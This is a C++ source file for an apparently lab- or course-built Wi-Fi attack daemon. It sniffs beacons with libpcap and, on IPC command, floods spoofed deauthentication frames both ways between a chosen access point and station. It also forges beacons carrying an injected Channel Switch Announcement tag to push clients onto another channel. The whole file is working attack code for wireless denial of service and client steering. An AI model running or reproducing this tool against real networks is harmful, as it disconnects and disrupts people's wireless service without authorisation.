#include "runner.h"
#include "suseongtrace.h"
#include "mac.h"
#include "radiotap.h"
#include "wireless.h"

Runner::Runner()
{
    isRunning = false;
    pcapRX = nullptr;
    pcapTX = nullptr;
}
Runner::~Runner()
{
    stop();
}

// non-blocking syscall
void setStdinNonBlock()
{
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
}

void Runner::TXloop()
{
    int deauthCounter = 0;
    int csaCounter = 0;

    while(isRunning)
    {
        ST_IPC_CMD cmd;
        {
            std::lock_guard<std::mutex> lock(cmdMutex);
            cmd = currentCmd;
        }
        uint32_t logCount = 100;

        if(cmd.action == 2)
        {
            // 1. AP -> STATION
            ST_DEAUTH_PACKET pktAtoS;
            pktAtoS.wl = getApDeauth(currentCmd.target_ap, currentCmd.target_st);
            pktAtoS.wl.seqControl = (deauthCounter % 4096) << 4;
            int res0 = pcap_sendpacket(pcapTX, (const u_char*)&pktAtoS, sizeof(pktAtoS));
            if (res0 != 0)
            {
                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                fflush(stderr);
            }

            // 2. STATION -> AP
            ST_DEAUTH_PACKET pktStoA;
            pktStoA.wl = getStDeauth(currentCmd.target_ap, currentCmd.target_st);
            pktStoA.wl.seqControl = (deauthCounter % 4096) << 4;
            int res1 = pcap_sendpacket(pcapTX, (const u_char*)&pktStoA, sizeof(pktStoA));
            if (res1 != 0)
            {
                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                fflush(stderr);
            }

            deauthCounter++;
            if(deauthCounter % logCount == 0)
            {
                ST_IPC_EVENT log;
                memset(&log, 0, sizeof(ST_IPC_EVENT));
                log.type = 1;
                snprintf(log.message, sizeof(log.message), "Deauth sent: %d", deauthCounter);
                std::lock_guard<std::mutex> outLock(outMutex);
                fwrite(&log, sizeof(ST_IPC_EVENT), 1, stdout);
                fflush(stdout);
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        else if(cmd.action == 3)
        {
            {
                std::lock_guard<std::mutex> lock(csaMutex);
                if(csaPacketLen > 0)
                {
                    int res2 =pcap_sendpacket(pcapTX, csaPacketBuf, csaPacketLen);
                    if (res2 != 0)
                    {
                        fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                        fflush(stderr);
                    }
                    csaCounter++;
                    if(csaCounter % 100 == 0)
                    {
                        ST_IPC_EVENT log;
                        memset(&log, 0, sizeof(ST_IPC_EVENT));
                        log.type = 1;
                        snprintf(log.message, sizeof(log.message), "CSA sent: %d", csaCounter);
                        std::lock_guard<std::mutex> outLock(outMutex);
                        fwrite(&log, sizeof(ST_IPC_EVENT), 1, stdout);
                        fflush(stdout);
                    }
                }
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
        else
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }
}

void Runner::RXloop(const std::string& dev)
{
    isRunning = true;
    device = dev;

    pcapRX = pcap_open_live(device.c_str(), BUFSIZ, 1, 100, errbuf);
    pcapTX = pcap_open_live(device.c_str(), BUFSIZ, 1, 100, errbuf);
    if(pcapRX == nullptr)
    {
        std::string errMsg = "pcap_open_live failed: ";
        errMsg += errbuf;
        TRACE(errMsg);
        return;
    }

    // DEAUTH
    setStdinNonBlock();
    memset(&currentCmd, 0, sizeof(ST_IPC_CMD));
    TXthread = std::thread(&Runner::TXloop, this);

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while(isRunning)
    {
        ST_IPC_CMD cmd;
        int readBytes = read(STDIN_FILENO, &cmd, sizeof(ST_IPC_CMD));
        if(readBytes == sizeof(ST_IPC_CMD))
        {
            std::lock_guard<std::mutex> lock(cmdMutex);
            currentCmd = cmd;
            fprintf(stderr, "[DAEMON] IPC Command Received! Action: %d\n", cmd.action);
            fflush(stderr);
            if (currentCmd.action == 4) break;
        }

        // Sniffing
        res = pcap_next_ex(pcapRX, &header, &packet);
        if(res == 0) continue; // 타임아웃
        if(res == -1 || res == -2) break; // error, breakloop

        ST_RDT rdt = capRdt(packet);
        ST_WL wl = capWl(packet+rdt.len);
        uint64_t wirelessLen = sizeof(wl);
        int16_t tagLen = 0;
        // 비콘 체크
        if (!chkBeacon(wl)) continue;
        if (currentCmd.action == 3 && memcmp(wl.bssid.mac, currentCmd.target_ap.mac, 6) == 0)
        {
            // CSA Start
            int packetCount = presentCount(packet);
            uint32_t capLen = header->caplen;
            bool isFcs = hasFcs(packet, &rdt, packetCount);

            const u_char* beaconTagPacket = (packet+rdt.len+wirelessLen+sizeof(ST_BC_COMMON));
            tagLen = capLen-rdt.len-wirelessLen-sizeof(ST_BC_COMMON);
            uint16_t newPacketLen = capLen + 5;

            if (isFcs) { tagLen -= 4; newPacketLen -=4; }

            uint16_t insertTagLoc = capLen - (isFcs?4:0) - tagLen + getInsertTagLoc(beaconTagPacket, tagLen, 37);
            uint16_t remainLen = capLen - insertTagLoc - (isFcs?4:0);

            uint8_t newPacket[4096];
            int offset = 0;

            uint8_t tx_rdt[12] = {0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00};
            memcpy(newPacket, tx_rdt, 12);
            offset += 12;

            int macToTagLen = insertTagLoc - rdt.len;
            memcpy(newPacket + offset, packet + rdt.len, macToTagLen);

            bool stationMode = false;
            for(int i=0; i<6; i++) { if(currentCmd.target_st.mac[i] != 0xFF) stationMode = true; }
            if(stationMode)
            {
                memcpy(newPacket+rdt.len+4, currentCmd.target_st.mac, 6);
            }
            offset += macToTagLen;

            // csa packet
            uint8_t csaTag[5] = {0x25, 0x03, 0x01, (uint8_t)currentCmd.channel, 0x03};
            memcpy(newPacket + offset, csaTag, 5);
            offset += 5;

            memcpy(newPacket + offset, packet + insertTagLoc, remainLen);
            offset += remainLen;

            uint16_t totalPacketLen = offset;

            std::lock_guard<std::mutex> csaLock(csaMutex);
            memcpy(csaPacketBuf, newPacket, totalPacketLen);
            csaPacketLen = totalPacketLen;
            // CSA End
        }
        ST_IPC_EVENT event;
        memset(&event, 0, sizeof(event));
        event.type = 0;
        event.bssid = wl.bssid;

        const u_char* tagStart = (packet + rdt.len + 24 + 12);
        tagLen = header->caplen - rdt.len - 36;
        // getEssid -> TAG 0이 없으면 false, 있으면 true
        if(!getEssid(event.essid, sizeof(event.essid), tagStart, tagLen)) continue;

        ST_RDT_DATA rdtData = getRdtInfo(packet, &rdt, presentCount(packet));
        if(rdtData.pwr != 999) event.pwr = static_cast<int16_t>(rdtData.pwr);
        int ch = getCh(tagStart, tagLen);
        if(0 < ch)
        {
            event.ch = static_cast<int16_t>(ch);
        }
        else // ch정보가 비콘 바디에 없는 경우. 라디오탭거 사용.
        {
            if(rdtData.ch != 0)
            {
                event.ch = static_cast<int16_t>(rdtData.ch);

            }
            else event.ch = 0;
        }

        std::lock_guard<std::mutex> outLock(outMutex);
        fwrite(&event, sizeof(ST_IPC_EVENT), 1, stdout);
        fflush(stdout);
    }
    isRunning = false;
    if(TXthread.joinable()) TXthread.join();
    pcap_close(pcapRX);
    pcap_close(pcapTX);
    pcapRX = nullptr;
    pcapTX = nullptr;

}

void Runner::stop()
{
    isRunning = false;
    if(pcapRX != nullptr) pcap_breakloop(pcapRX);
    if(pcapTX != nullptr) pcap_breakloop(pcapTX);
}
